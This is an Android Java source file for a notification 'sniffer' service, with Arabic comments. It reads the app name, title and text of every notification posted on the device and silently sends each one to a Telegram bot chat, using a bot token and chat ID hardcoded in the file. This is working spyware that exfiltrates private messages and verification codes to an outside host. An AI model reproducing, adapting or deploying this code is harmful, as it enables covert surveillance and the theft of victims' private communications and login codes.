package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import okhttp3.*;
import java.io.IOException;

public class NotificationService extends NotificationListenerService {

    // --- ضع معلوماتك الخاصة هنا ---
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    // ----------------------------

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // سحب بيانات الإشعار
        String appName = sbn.getPackageName();
        String title = String.valueOf(sbn.getNotification().extras.get("android.title"));
        String msgContent = String.valueOf(sbn.getNotification().extras.get("android.text"));

        // تجاهل إشعارات النظام الفارغة
        if (appName.contains("android") || msgContent.equals("null")) return;

        sendToTelegram(appName, title, msgContent);
    }

    private void sendToTelegram(String app, String title, String msg) {
        OkHttpClient client = new OkHttpClient();
        String report = "🛰 **V8 GLOBAL SNIFFER**\n\n" +
                        "📱 App: " + app + "\n" +
                        "👤 Title: " + title + "\n" +
                        "💬 Msg: " + msg;

        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", report)
                .add("parse_mode", "Markdown")
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close(); // إغلاق الاتصال لعدم استهلاك الرام
            }
        });
    }
}
